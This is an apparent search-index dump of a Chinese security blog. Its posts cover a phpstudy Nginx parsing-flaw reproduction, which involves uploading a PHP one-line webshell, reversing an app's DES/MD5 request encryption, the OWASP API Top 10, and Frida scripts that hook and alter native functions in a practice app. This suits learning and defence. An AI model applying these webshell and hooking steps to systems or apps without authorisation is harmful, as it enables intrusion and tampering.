[{"title":"phpstudy 默认配置解析漏洞","url":"/2020/09/06/渗透/web安全/phpstudy/phpstudy 默认配置解析漏洞复现/","content":"\n# phpstudy 默认配置 Nginx解析漏洞\n\n## 漏洞描述\n\n​\t\t在`phpstudy<=8.1.0.7 for Windows`中，默认采用自带的Nginx + PHP FastCGI组合存在不安全配置，导致`nginx解析漏洞`，nginx的解析漏洞是历史已知的漏洞 `/xx.php`\n\n## 威胁等级\n\n高危\n\n## 影响版本\n\nphpstudy: <=8.1.0.7（漏洞只影响windows版本）\n\n## 漏洞复现\n\n 1 安装phpstudy  版本号小于 8.1.0.7\n\n​\t安装步骤： 下一步\n\n\n\n2 将php类型的一句话小马放在根目录下，访问时追加`/.php` 即可\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/9/20200906144032.png)\n\n\n\n## 漏洞分析\n\n 看看nginx 解析漏洞原因\n\n>1、由于用户的错误配置导致nginx把以.php结尾的文件交给fastcgi处理,为此可以构造http://www.xxx.com/test.gif/xx.php (任何服务器端不存在的php文件均可,比如a.php)\n>\n>![](https://raw.githubusercontent.com/ST0new/picture/master/2020/9/20200906145049.png)\n>\n>​\t在vhosts.conf 文件下\n>\n>​\t![](https://raw.githubusercontent.com/ST0new/picture/master/2020/9/20200906145250.png)\n>\n>​\t由于如下的配置文件会导致 .php.* 文件交给fastcgi\n>\n>2、但是fastcgi在处理xx.php文件时发现文件并不存在,这时php.ini配置文件中cgi.fix_pathinfo=1 发挥作用,这项配置用于修复路径,如果当前路径不存在则采用上层路径。为此这里交由fastcgi处理的文件就变成了/test.gif。\n>\n>\n>\n>3、 最重要的一点是php-fpm.conf中的security.limit_extensions配置项限制了fastcgi解析文件的类型(即指定什么类型的文件当做代码解析),此项设置为空的时候才允许fastcgi将.png等文件当做代码解析。\n\n## 修复方式\n\n这里找官网的公告就行，没找到 可以参考以下\n\nphp.ini 中 fix_pathinfo 禁用为0\n\n> cgi.fix_pathinfo=0\n\nNginx.conf添加如下代码\n\n```\n location ~ \\.php(.*)$ {\n      if ( $fastcgi_script_name ~ \\..*\\/.*php ){\n        return 403;\n      }\n    \n            fastcgi_pass   127.0.0.1:9000;\n            fastcgi_index  index.php;\n            fastcgi_split_path_info  ^((?U).+\\.php)(/?.+)$;\n            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;\n            fastcgi_param  PATH_INFO  $fastcgi_path_info;\n            fastcgi_param  PATH_TRANSLATED  $document_root$fastcgi_path_info;\n            include        fastcgi_params;\n        }\n```\n\n\n\n---\n\n参考链接：\n\nhttps://mp.weixin.qq.com/s/nMgFxNzWfCe7m5DtkIBkgQ\n\nhttps://wiki.0-sec.org/#/md","tags":["漏洞"],"categories":["penetration"]},{"title":"scrapy 框架学习","url":"/2020/08/28/编程/python/python爬虫scarpy/","content":"\n\n\n# 入坑scrapy \n\n在自己学习了一段时间爬虫之后（其实也就是了解了下爬虫），我就迫不及待的想学习心得东西了。 今天就入手`scrapy `框架\n\n[官方文档](https://doc.scrapy.org/en/latest/intro/install.html)\n\n## 安装\n\n安装上基本没啥大问题，缺啥补啥就行\n\n这里我选择使用Python虚拟环境virtualenv，大家可以参考: [Python虚拟环境virtualenv使用说明](https://www.jianshu.com/p/a08cc9a398a3).\n\n进入虚拟环境`workon scrapy`,友情提醒先更新pip的命令`pip install --upgrade pip`\n\n然后安装scrapy `pip install scrapy`\n\n我自己除了pip的版本问题，其他都没遇到，可能之前已经补完了。继续看官方文档。\n\n\n\n---\n\n\n\n参考链接：\n\nhttps://docs.scrapy.org/en/latest/intro/install.html\n\n[Python虚拟环境virtualenv使用说明](https://www.jianshu.com/p/a08cc9a398a3)","tags":["破解"],"categories":["Reverse"]},{"title":"某app加密算法分析","url":"/2020/08/28/逆向/破解/某app加密算法分析/","content":"\n# app 逆向分析\n\n在分析一款app的时候发现请求和响应都是加密的，这就让人很头疼，也测不了漏洞，这个现象也是app常见的一类难以攻克的难题。（水一篇）\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/8/20200828160635.png)\n\n# 算法分析\n\n​\t\t对于这类的app 首先看看是否带壳 ，如果不带壳直接看源码，带壳了就先考虑脱壳，加固难度大就需要利用其他方法获取目标内容。\n\n​\t\t我遇到这个app比较简单，没有加固，所以直接分析源码。搜索请求的关键字：`md5key`  只有一处，这里小技巧，尽量选择出现次数少的地方分析，可以更加精确。\n\n​\t\t![](https://raw.githubusercontent.com/ST0new/picture/master/2020/8/20200828161251.png)\n\n​\t\t可以看到这里有个`DES.EncodeCBC`并且将它的值在最后put给了data，跟进一下分析，看起来是个DES的加解密的源码。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/8/20200828161546.png)\n\n​\t\t另一个每次都会发生改变的参数：md5key ，在之前的截图中就能得到是所有参数的md5值。\n\n​\t\t变化的参数解决了，接下来就是写脚本还原加密过程。\t\n\n​\t\t这里就不放代码了，说几个在写代码中遇到的bug。\n\n* 问题1： 运行后返回的结果与app返回结果不一致。\n\n  解决方法： 调用base64改为：`import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;`\n\n* 问题2： 当key为16位时报错：`Wrong key size`\n\n  解决方法:\n\n  ```\n  public static byte[] checkKey(String key) {\n          int base = 32;\n          byte[] keyBytes = key.getBytes();\n          if (keyBytes.length % base != 0) {\n              int groups = keyBytes.length / base + (keyBytes.length % base != 0 ? 1 : 0);\n              byte[] temp = new byte[groups * base];\n              Arrays.fill(temp, (byte) 0);\n              System.arraycopy(keyBytes, 0, temp, 0, keyBytes.length);\n              keyBytes = temp;\n          }\n          return keyBytes;\n      }\n  ```\n\n\n\n\n\n---\n\n本app算法不难， 主要是在写解密和加密脚本遇到的问题较多，我将我遇到的问题解决办法已经写出。 ","tags":["破解"],"categories":["Reverse"]},{"title":"Java学习核心语法基础","url":"/2020/07/24/编程/Java/Java学习核心语法基础篇/","content":"\n# java 语法基础\n\n## 1数据类型\n\n* 基本数据类型：八大基本数据类型 4 2 1  1 \n\n  ​\t4种整数类型：byte（-128 - +127）、short 、 int 、 long\n\n  ​\t2种浮点类型：float、 double\n\n  ​\t1种字符类型：char 默认值 \"\\\\0\"\n\n  ​\t1种布尔类型： boolean  (false\\true)\n\n* 原始数据类型： 基本数据类型+ void\n\n## 2.1变量定义\n\n> 数据类型 变量名称 = 值<必须为数据类型可以兼容的>；\n\n## 2.2 常量定义\n\n> 添加final 来声明常量 \n>\n> final double PI = 3.14 ;  \n\n## 3标识符命名规范\n\n* 在java 中能够自定义的字符串都是标识符。\n* 以字母、数字、下划线 、$  开头。\n* 命名采用驼峰命名方式，并且不能使用java中的保留关键字。\n* 标识符命名有意义，不要使用中文、拼音缩写命名。\n* 变量和方法名称必须使用小写字母开始；类名必须使用大写字母开头；常量必须全部大写，多个单词使用下划线分割。\n\n## 4变量操作\n\n```java\npublic class JavaBase {\n    // 程序入口main Alt+/ enter , 主线程\n    public static void main(String[] args) {\n        byte a = -128;\n        short s = 1221;\n        int i = 100;\n        long l = 100;\n        float f = 4.5f;\n        double d = 4.3;\n        char c = 'a';\n        boolean flag = true;\n    }\n}\n```\n\n### 4.1连接操作\n\n\n\n### 4.2运算操作\n\n#### 4.2.1算术操作\n\n#### 4.2.2位运算\n\n#### 4.2.3逻辑运算\n\n#### 4.2.4三目运算\n\n### 4.3转换操作\n\n#### 4.3.1数据类型的转换\n\n## 5 控制流程\n\n### 5.1判断\n\n### 5.2 选择\n\n### 5.3 循环\n\n### 5.4 continue，break结束\n\n------\n\n# 科普内容\n\n> JDK （java开发工具包） javac.exe\n>\n> JVM （java 虚拟机）\n>\n> JRE （java运行环境）\n\n## windows快捷键\n\nWIN + E 打开资源管理器\n\nWIN + E  打开命令运行界面\n\n## DOS 窗口\n\ndir ： 查看目录\n\ncd ： 进入某个目录\n\n \t\t.. 上一级目录\n\n​\t\t. 当前目录\n\n​\t\t/ 根目录\n\n盘符： c:、 d: 、e:\n\n## 注意事项\n\n- 在Java中，一个java文件只能有一个主类，即 只能有一个public 修饰的类。\n\n  ","tags":["Java"],"categories":["Code"]},{"title":"OWASP API Top 10","url":"/2020/07/09/渗透/owasp top10/","content":"\n# OWASP API TOP 10\n\n本文搬运自：https://apisecurity.io/encyclopedia/content/owasp/owasp-api-security-top-10.htm\n\n## TOP1：2019 —破碎的对象级别授权\n\n没有对请求的id进行适当的检查，导致遍历id即可越权访问其他用户可访问的数据，这种攻击也称为IDOR（不安全的直接对象引用）。\n\n### 用例\n\n- API调用参数使用通过API访问的资源的ID `/api/shop1/financial_info`。\n- 攻击者用他们猜测出的另一种ID替换其资源的ID `/api/shop2/financial_info`。\n- 该API不检查权限，而是允许请求通过。\n- 如果ID可以枚举，则会加剧问题`/api/123/financial_info`。\n\n### 如何预防\n\n- 使用用户策略和层次结构实施授权检查。\n- 不要依赖客户端发送的ID。请改用存储在会话对象中的ID。\n- 检查每个客户端访问数据库请求的授权。\n- 使用无法猜测的随机ID（UUID）。\n\n## TOP2：2019 —身份验证失败\n\nAPI的身份验证可以伪造，token或sign本地生成可以伪造等都可以使得攻击者可以以其他用户的身份。\n\n### 用例\n\n- 被视为“内部”的不受保护的API\n- 不遵循行业最佳实践的弱认证\n- 不会旋转的弱API密钥 （对称加密）\n- 弱密码，纯文本密码，加密密码，散列错误密码，共享密码或默认密码\n- 身份验证容易受到蛮力攻击和凭证填充\n- URL中包含的凭证和密钥\n- 缺少访问令牌验证（包括JWT验证）\n- 未签名或签名较弱的未到期JWT\n\n### 如何预防\n\n- 检查所有可能的方式以对所有API进行身份验证。\n- 密码重置和一次性链接的API还允许用户进行身份验证，并且应同样严格地加以保护。\n- 使用标准身份验证，令牌生成，密码存储和多因素身份验证（MFA）。\n- 使用短期访问令牌。\n- 对您的应用进行身份验证（以便您知道谁在与您聊天）。\n- 使用更严格的速率限制进行身份验证，并实施锁定策略和弱密码检查。\n\n## TOP3：2019 —数据暴露过多\n\n将过多的数据返回给用户，比如请求用户名的API接口返回了 这个用户在数据库中的所有信息，这将使得你了解所有，这取决于客户端进行筛选。如果攻击者直接使用该API，他们将拥有全部。\n\n### 用例\n\n- 该API返回完整的数据对象，因为它们存储在后端数据库中。\n- 客户端应用程序过滤响应，仅显示用户真正需要查看的数据。\n- 攻击者直接调用API，并获取UI会过滤掉的敏感数据。\n\n### 如何预防\n\n- 永远不要依赖客户端来过滤数据！\n- 查看所有API响应，并使其适应API使用者的实际需求。\n- 仔细定义所有API响应的架构。\n- 不要忘记错误响应，也要定义正确的架构。\n- 识别所有敏感数据或个人身份信息（PII），并证明其使用合理性。\n- 强制执行响应检查以防止数据意外泄漏或异常。\n\n## TOP4：2019 —缺乏资源和速率限制\n\n没有针对过多的调用或有效载荷大小保护API。攻击者可以将其用于拒绝服务（DoS）和诸如蛮力攻击之类的身份验证缺陷。\n\n### 用例\n\n- 攻击者通过发送超出其处理能力的请求使API过载。\n- 攻击者以超过API处理速度的速度发送请求，从而阻塞了请求。\n- 请求的大小或其中的某些字段超出了API可以处理的大小。\n- “ Zip炸弹”是指经过设计的存档文件，因此，解压缩这些文件会占用大量资源，并使API过载。\n\n### 如何预防\n\n- 定义适当的速率限制。\n- 限制有效负载大小。\n- 调整速率限制以匹配需要或应允许获得的API方法，客户端或地址。\n- 添加压缩率检查。\n- 定义容器资源的限制。\n\n## Top5：2019 —功能级别授权已损坏\n\n该API依赖于客户端以适当地使用用户级别或管理员级别的API。攻击者找出“隐藏的”管理API方法并直接调用它们。（可以在app反编译后寻找）\n\n### 用例\n\n- 一些管理功能公开为API。\n- 普通用户如果知道如何可以未经授权访问这些功能。\n- 可以是知道URL的问题，或使用其他动词或参数的问题：\n  - `/api/users/v1/user/myinfo`\n  - `/api/admins/v1/users/all`\n\n### 如何预防\n\n- 不要依赖客户端来强制管理员访问。\n- 默认情况下拒绝所有访问。\n- 仅允许对属于适当组或角色的用户进行操作。\n- 正确设计和测试授权。\n\n## TOP6：2019 —批量分配\n\n该API会获取客户端提供的数据并将其存储，而不会对列入白名单的属性进行适当的过滤。攻击者可以尝试猜测对象属性或在其请求中提供其他对象属性，阅读文档，或查看API端点以获取在何处找到开口以修改其不应在后端存储的数据对象上使用的属性的线索。（对请求的数据未进行检测就保存）\n\n### 用例\n\n- 该API无需正确过滤即可与数据结构一起使用。\n- 接收到的有效负载被盲目转换为对象并存储。\n  - NodeJS：\n    `var user = new User(req.body);`\n    `user.save();`\n  - 滑轨：\n    `@user = User.new(params[:user])`\n- 攻击者可以通过查看`GET`请求数据来猜测字段。\n\n### 如何预防\n\n- 不要自动绑定传入的数据和内部对象。\n- 明确定义您期望的所有参数和有效负载。\n- 在对象架构中使用可以将`readOnly`属性集设置为`true`可通过API检索但绝不能修改的所有属性。\n- 准确定义在设计时将在请求中接受的模式，类型和模式，并在运行时强制执行它们。\n\n## TOP7：2019 —安全配置错误\n\nAPI服务器的配置不当使攻击者可以利用它们。\n\n### 用例\n\n- 未修补的系统\n- 未受保护的文件和目录\n- 未硬化的图像\n- 缺少，过时或配置错误的TLS\n- 公开的存储或服务器管理面板\n- 缺少CORS策略或安全标头\n- 带堆栈跟踪的错误消息\n- 启用了不必要的功能\n\n### 如何预防\n\n- 建立可重复的强化和修补过程。\n- 自动发现配置缺陷。\n- 禁用不必要的功能。\n- 限制管理访问。\n- 定义并执行所有输出，包括错误。\n\n## TOP8：2019 —注射\n\n攻击者构造的API调用包括SQL，NoSQL，LDAP，OS或该API或背后的后端盲目执行的其他命令。\n\n### 用例\n\n- 攻击者发送恶意输入以转发给内部解释器：\n  - 的SQL\n  - NoSQL\n  - LDAP\n  - 操作系统命令\n  - XML解析器\n  - 对象关系映射（ORM）\n\n### 如何预防\n\n- 切勿信任您的API使用者，即使他们是内部使用者也是如此。\n- 严格定义所有输入数据，例如模式，类型和字符串模式，并在运行时实施它们。\n- 验证，过滤和清理所有传入的数据。\n- 定义，限制和执行API输出，以防止数据泄漏。\n\n## TOP9：2019 —资产管理不当\n\n攻击者发现未受到生产API良好保护的非生产API版本（例如，登台，测试，测试版或早期版本），然后使用这些版本来发起攻击。\n\n### 用例\n\n- DevOps，云，容器和Kubernetes使多个部署变得容易（例如，开发，测试，分支，暂存，旧版本）。\n- 希望保持向后兼容性，以迫使旧的API继续运行。\n- 旧版本或非生产版本均未正确维护，但是这些端点仍可以访问生产数据。\n- 一旦通过一个端点进行了身份验证，攻击者就可以切换到另一个生产端点。\n\n### 如何预防\n\n- 保持所有API主机的最新清单。\n- 限制访问任何不应该公开的内容。\n- 限制对生产数据的访问，并将对生产和非生产数据的访问分开。\n- 实施其他外部控件，例如API防火墙。\n- 正确淘汰旧版本的API或对其进行反向移植安全修复。\n- 实现严格的身份验证，重定向，CORS等。\n\n### TOP10：2019 —日志和监视不足\n\n缺乏适当的日志记录，监视和警报功能，攻击者和攻击者都不会被察觉。\n\n### 用例\n\n- 日志不受完整性保护。\n- 日志未集成到安全信息和事件管理（SIEM）系统中。\n- 日志和警报设计不当。\n- 公司依靠手动而不是自动化系统。\n\n### 如何预防\n\n- 记录失败尝试，拒绝访问，输入验证失败或安全策略检查中的任何失败。\n- 确保日志已格式化，以便其他工具也可以使用它们。\n- 保护日志，例如高度敏感的信息。\n- 包括足够的详细信息以识别攻击者。\n- 避免在日志中包含敏感数据-如果您需要信息以进行调试，请对其进行部分编辑。\n- 与SIEM和其他仪表板，监视和警报工具集成。","tags":["API"],"categories":["APP"]},{"title":"Hook jni 主动调用","url":"/2020/06/18/逆向/XposedFridaHook系列/jni 主动调用/","content":"\n# Hook jni 主动调用\n\n要对hellofromc 进行主动调用，修改返回值，但是这里不能直接通过replace去修改返回值，而是要通过newstringutf 去修改返回值。\n\n```\nfunction hookTest8(){\n    var funcAddr = Module.findExportByName(\"libxiaojianbang.so\", \"Java_com_xiaojianbang_app_NativeHelper_helloFromC\");\n    console.log(\"hellofromC \\r\\n\",funcAddr);\n    if(funcAddr != null){\n        Interceptor.attach(funcAddr,{\n            onEnter: function(args){\n\n            },\n            onLeave: function(retval){\n                var env = Java.vm.tryGetEnv();\n                var jstr = env.newStringUtf(\"www.zygx8.com\");  // 小驼峰写法 C++ 方式 主动调用jni函数 cstr转jstr\n                retval.replace(jstr);\n                var cstr = env.getStringUtfChars(jstr); //主动调用 jstr转cstr\n                console.log(cstr.readCString());\n                console.log(hexdump(cstr));\n            }\n        });\n    }\n}\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200618123658.png)","tags":["hook"],"categories":["Reverse"]},{"title":"jni函数hook","url":"/2020/06/18/逆向/XposedFridaHook系列/jni函数hook计算地址方式/","content":"\n# jni函数hook（计算 地址方式）\n\n```\nfunction hookTest9() {\n    Java.perform(function () {\n        var env = Java.vm.tryGetEnv();\n        console.log(JSON.stringify(env));\n        var newStringUtfAddr = ptr(env.handle).readPointer().add(0x29C).readPointer();\n        console.log(newStringUtfAddr);\n        if (newStringUtfAddr != null) {\n            Interceptor.attach(newStringUtfAddr, {\n                onEnter: function (args) {\n\n                    //console.log(hexdump(args[1]));\n\n                },\n                onLeave: function (retval) {\n\n                }\n            })\n        }\n        var registerNativesAddr = ptr(env.handle).readPointer().add(0x35C).readPointer();\n        console.log(registerNativesAddr);\n        if (registerNativesAddr != null) {\n            Interceptor.attach(registerNativesAddr, {\n                onEnter: function (args) {\n                    console.log(args[2].readPointer().readCString())\n                    console.log((args[2]).add(Process.pointerSize).readPointer().readCString()); // 这个是结构体 process.pointerSize() 移动一个位置签名\n\n                    console.log(args[2].add(Process.pointerSize *2).readPointer())\n                    console.log(hexdump(args[2]));\n                    console.log(Module.findBaseAddress(\"libxiaojianbang.so\").add(0x22F0))\n\n                },\n                onLeave: function (retval) {\n                }\n            })\n        }\n    })\n}\n```\n\n\n\n\n\n\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200618134812.png)\n\n# hook libart.so\n\njni 在编译后在libart.so 里","tags":["hook"],"categories":["Reverse"]},{"title":"Hook 计算非导出函数地址","url":"/2020/06/18/逆向/XposedFridaHook系列/hook 读写内存数据/","content":"\n# hook 读写内存数据\n\n对string字符串，可能是加密的，可以通过直接hook 加载的内存数据来读取解密状态的字符串\n\n```\n读取内存字符串数据\n\nfunction hookTest7() {\n    var soAddr = Module.findBaseAddress(\"libxiaojianbang.so\");\n    console.log(soAddr);\n    if(soAddr != NULL){\n        console.log(soAddr.add(0x2764).readCString())\n    }\n}\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200618115949.png)\n\n\n\n写内存出现了报错，还未解决\n\n```\nfunction hexToBytes(str) {\n    var pos = 0;\n    var len = str.length;\n    if (len % 2 != 0) {\n        return null;\n    }\n    len /= 2;\n    var hexA = new Array();\n    for (var i = 0; i < len; i++) {\n        var s = str.substr(pos, 2);\n        var v = parseInt(s, 16);\n        hexA.push(v);\n        pos += 2;\n    }\n    return hexA;\n}\n\nfunction stringToBytes(str) {\n    var ch, st, re = [];\n    for (var i = 0; i < str.length; i++ ) {\n        ch = str.charCodeAt(i);\n        st = [];\n        do {\n            st.push( ch & 0xFF );\n            ch = ch >> 8;\n        }\n        while ( ch );\n        re = re.concat( st.reverse() );\n    }\n    return re;\n}\nfunction hookTest7(){\n    var soAddr = Module.findBaseAddress(\"libxiaojianbang.so\");\n    console.log(soAddr);\n    if(soAddr != null){\n        //console.log(soAddr.add(0x2C00).readCString());\n        //console.log(hexdump(soAddr.add(0x2C00)));  //读取指定地址的字符串\n\n        //var strByte = soAddr.add(0x2C00).readByteArray(16); //读内存\n        //console.log(strByte);\n        \n        //soAddr.add(0x2C00).writeByteArray(stringToBytes(\"xiaojianbang\")); //写内存\n        //console.log(hexdump(soAddr.add(0x2C00)));  //dump指定内存\n\n        //var bytes = Module.readByteArray(soAddr.add(0x2C00), 16);\n        //console.log(bytes);\n\n    }\n}\n```\n\n","tags":["hook"],"categories":["Reverse"]},{"title":"Hook 导出函数和修改函数参数返回值","url":"/2020/06/15/逆向/XposedFridaHook系列/Hook 导出函数和修改函数参数返回值/","content":"\n# Hook 导出函数\n\n```\n// hook 导出函数\nfunction hookTest1() {\n     var addAddr = Module.findExportByName(\"libxiaojianbang.so\", \"Java_com_xiaojianbang_app_NativeHelper_add\");\n     console.log(addAddr);\n\n     if (addAddr != NULL){\n         Interceptor.attach(addAddr,{\n             onEnter:function (args) {\n                console.log(args[0]);\n                console.log(args[1]);\n                args[2] = ptr(1000);\n                console.log(args[2]);\n                console.log(args[3]);\n                console.log(args[4]);\n\n             },\n             onLeave:function (retval) {\n                console.log(retval);\n                console.log(retval.toInt32());\n             }\n         })\n     }\n}\nfunction main(){\n    Java.perform(function () {\n     hookTest1();\n    })\n}\n\nsetImmediate(main)\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200615100331.png)\n\n## hook 修改函数参数返回值\n\n修改`onEnter` 参数的值\n\n```\nfunction hookTest1() {\n     var addAddr = Module.findExportByName(\"libxiaojianbang.so\", \"Java_com_xiaojianbang_app_NativeHelper_add\");\n     console.log(addAddr);\n\n     if (addAddr != NULL){\n         Interceptor.attach(addAddr,{\n             onEnter:function (args) {\n                console.log(args[0]);\n                console.log(args[1]);\n                args[2] = ptr(1000);  // 这里这个可以修改参数的值，ptr是 new Nativepointer 的简写\n                console.log(args[2]);\n                console.log(args[3]);\n                console.log(args[4]);\n\n             },\n             onLeave:function (retval) {\n                console.log(retval);\n                console.log(retval.toInt32());\n             }\n         })\n     }\n}\n```\n\n修改`onLeave`的值\n\n```\nfunction hookTest1() {\n    var addAddr = Module.findExportByName(\"libxiaojianbang.so\", \"Java_com_xiaojianbang_app_NativeHelper_add\");\n    console.log(addAddr);\n\n    if (addAddr != NULL) {\n        Interceptor.attach(addAddr, {\n            onEnter: function (args) {\n                console.log(args[0]);\n                console.log(args[1]);\n                args[2] = ptr(1000);\n                console.log(args[2]);\n                console.log(args[3]);\n                console.log(args[4]);\n\n            },\n            onLeave: function (retval) {\n                retval.replace(123999) // 通过replace 去修改返回值参数\n                console.log(retval);\n                console.log(retval.toInt32());\n            }\n        })\n    }\n}\n```","tags":["hook"],"categories":["Reverse"]},{"title":"Hook dlopen","url":"/2020/06/15/逆向/XposedFridaHook系列/hook dlopen/","content":"\n# hook dlopen\n\n在刚开始hook 我们必须使得app加载so 才能hook， 我们可以hook`dlopen` 获取到so在那加载，在高版本中有一些so会走`android_dlopen_ext`\n\n```\nfunction hookTest6(){\n    var dlopen = Module.findExportByName(null, \"dlopen\");\n    console.log(dlopen);\n    if(dlopen != null){\n        Interceptor.attach(dlopen,{\n            onEnter: function(args){\n                var soName = args[0].readCString();\n                console.log(soName);\n                if(soName.indexOf(\"libxiaojianbang.so\") != -1){\n                    this.hook = true;\n                }\n            },\n            onLeave: function(retval){\n                //if(this.hook) { hookTest5() };\n            }\n        });\n    }\n\n    var android_dlopen_ext = Module.findExportByName(null, \"android_dlopen_ext\");\n    console.log(android_dlopen_ext);\n    if(android_dlopen_ext != null){\n        Interceptor.attach(android_dlopen_ext,{\n            onEnter: function(args){\n                var soName = args[0].readCString();\n                console.log(soName);\n                if(soName.indexOf(\"libxiaojianbang.so\") != -1){\n                    this.hook = true;\n                }\n            },\n            onLeave: function(retval){\n                //if(this.hook) { hookTest5() };\n            }\n        });\n    }\n\n}\n```\n\n当我在点击`cmd5`的时候 就会爆出调用的so\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200618114840.png)\n\n然后在调用dlopen之后我们点击cmd5 看看是否能加载成功\n\n```\nfunction hookTest6(){\n    var dlopen = Module.findExportByName(null, \"dlopen\");\n    console.log(\"dloopen \\r\\n\",dlopen);\n    if(dlopen != null){\n        Interceptor.attach(dlopen,{\n            onEnter: function(args){\n                var soName = args[0].readCString();\n                console.log(soName);\n                if(soName.indexOf(\"libxiaojianbang.so\") != -1){\n                    this.hook = true;\n                }\n            },\n            onLeave: function(retval){\n                if(this.hook) { hookTest5() };\n            }\n        });\n    }\n    var android_dlopen_ext = Module.findExportByName(null, \"android_dlopen_ext\");\n    console.log(android_dlopen_ext);\n    if(android_dlopen_ext != null){\n        Interceptor.attach(android_dlopen_ext,{\n            onEnter: function(args){\n                var soName = args[0].readCString();\n                console.log(soName);\n                if(soName.indexOf(\"libxiaojianbang.so\") != -1){\n                    this.hook = true;\n                }\n            },\n            onLeave: function(retval){\n                if(this.hook) { hookTest5() };\n            }\n        });\n    }\n\n}\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200618115153.png)","tags":["hook"],"categories":["Reverse"]},{"title":"Hook 获取指针参数的返回值","url":"/2020/06/15/逆向/XposedFridaHook系列/获取指针参数的返回值/","content":"\n# Hook 获取指针参数的返回值\n\n在c语言中，一般都会以指针传递返回的值 ，没有return 或者return为true\n\nhook sub_750 打印参数和输出\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200618112010.png)\n\n\n\n```\nfunction hookTest5(){\n    var soAddr = Module.findBaseAddress(\"libxiaojianbang.so\");\n    //console.log(\"soAddr -->\"+ soAddr);\n    var sub_750 = soAddr.add(0x750); //函数地址计算 thumb+1 ARM不加\n    //console.log(\"sub_750-->\"+sub_750);\n\n     if(sub_750 != null){\n        Interceptor.attach(sub_750,{\n            onEnter: function(args){\n                console.log(\"args[0]:\\r\\n\",hexdump(args[0]));\n                console.log(\"args[1]:\\r\\n\",args[1].readCString())\n                console.log(\"args[2]:\\r\\n\",args[2].toInt32());\n            },\n            onLeave: function(retval){\n                console.log(\"retval:\\r\\n\",hexdump(retval));\n            }\n        });\n     }\n}\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200618112949.png)\n\n> 在打印sub_1AA0的时候发现，单纯打印v10的输入是没有用的，结果也不对应，这时候可能是函数内部对v10进行了某种操作，对于这种情况可以将v10的地址给一个变量，在函数运行结束后打印v10\n\n```\n\nfunction hookTest5(){\n    var soAddr = Module.findBaseAddress(\"libxiaojianbang.so\");\n   \n     var sub_1AA0= soAddr.add(0x1AA0); //函数地址计算 thumb+1 ARM不加\n    //console.log(\"sub_750-->\"+sub_750);\n     if(sub_1AA0 != null){\n        Interceptor.attach(sub_1AA0,{\n            onEnter: function(args){\n                this.args1 = args[1];\n            },\n            onLeave: function(retval){\n                console.log(hexdump(this.args1));\n\n            }\n        });\n     }\n}\n```\n\n\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200618112726.png)","tags":["hook"],"categories":["Reverse"]},{"title":"Hook 计算非导出函数地址","url":"/2020/06/15/逆向/XposedFridaHook系列/Hook 非导出函数地址/","content":"\n# Hook 计算非导出函数地址\n\n```\n计算公式：\n\t基址 + 函数偏移地址 + 1 thumb指令集 2 或4\n\t基址 + 函数偏移地址  arm 指令集 4\n\t\n\n```\n\n```\nfunction hookTest2() {\n    var soAddr = Module.findBaseAddress(\"libxiaojianbang.so\");\n    console.log(soAddr);\n    var funcAddr = soAddr.add(0x1848 + 1); // 基址加上偏移地址\n    console.log(funcAddr)\n}\n```\n\n## 通过proc 文件系统获取地址\n\n在 `proc/当前进程id/` 下存在很多文件\n\n在`proc/当前id/net/tcp` 记录开放端口  69A2 对应 27042\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200615113508.png)\n\n在`proc/当前id/maps` 记录加载的依赖库，可以找到so文件的基址\n\n ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200615113638.png)\n\n\n\n","tags":["hook"],"categories":["Reverse"]},{"title":"Hook so 导入导出表","url":"/2020/06/11/逆向/XposedFridaHook系列/hook导入导出表/","content":"\n# hook so 导入导出表\n\n## 启动frida\n\n打开两个cmd 窗口\n\n```\n第一个cmd窗口\nadb shell\nsu\ncd /data/local/tmp\n./fx  // 这个是frida-server-12.8.14-android-x86的缩写\n```\n\n```\n第二个cmd窗口\nadb froward tcp:27042 tcp:27042\nfrida -U com.xiaojianbang.app -l hookso.js\n```\n\n## 编写frida 脚本\n\n### 获取导入函数信息\n\n```\n先打印一下导入函数名\nfunction hookso(){\n    var imports = Module.enumerateImports(\"libxiaojianbang.so\")\n    for(var i = 0; i < imports.length; i++){\n        console.log(JSON.stringify(imports[i]));\n    }\n}\nfunction main(){\n    Java.perform(function () {\n    hookso();\n\n    })\n}\n\nsetImmediate(main)\n```\n\n可以看到导入的函数、模块、地址\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200611162048.png)\n\n### 获取某导入函数的信息\n\n```\nfunction hookso(){\n    var imports = Module.enumerateImports(\"libxiaojianbang.so\")\n    for(var i = 0; i < imports.length; i++){\n        //console.log(JSON.stringify(imports[i]));\n        if (imports[i].name == \"strncat\")\n            console.log(JSON.stringify(imports[i]));\n\n    }\n}\nfunction main(){\n    Java.perform(function () {\n    hookso();\n\n    })\n}\nsetImmediate(main)\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200611162805.png)\n\n### 获取导出函数信息\n\n```\nfunction hookso(){\n    var exports = Module.enumerateExports(\"libxiaojianbang.so\")\n    for(var i = 0; i < exports.length; i++){\n    \tconsole.log(JSON.stringify(exports[i]));\n    }\n}\nfunction main(){\n    Java.perform(function () {\n    hookso();\n\n    })\n}\nsetImmediate(main)\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200611163353.png)\n\n### 获取导出函数地址\n\n```\n\n\nfunction hookso(){\n    // 获取导出函数地址\n    var addr = Module.findExportByName(\"libxiaojianbang.so\",\"Java_com_xiaojianbang_app_NativeHelper_add\")\n    console.log(addr)\n}\nfunction main(){\n    Java.perform(function () {\n    hookso();\n\n    })\n}\n\n\nsetImmediate(main)\n```\n\n\n\n","tags":["hook"],"categories":["Reverse"]},{"title":"Hook 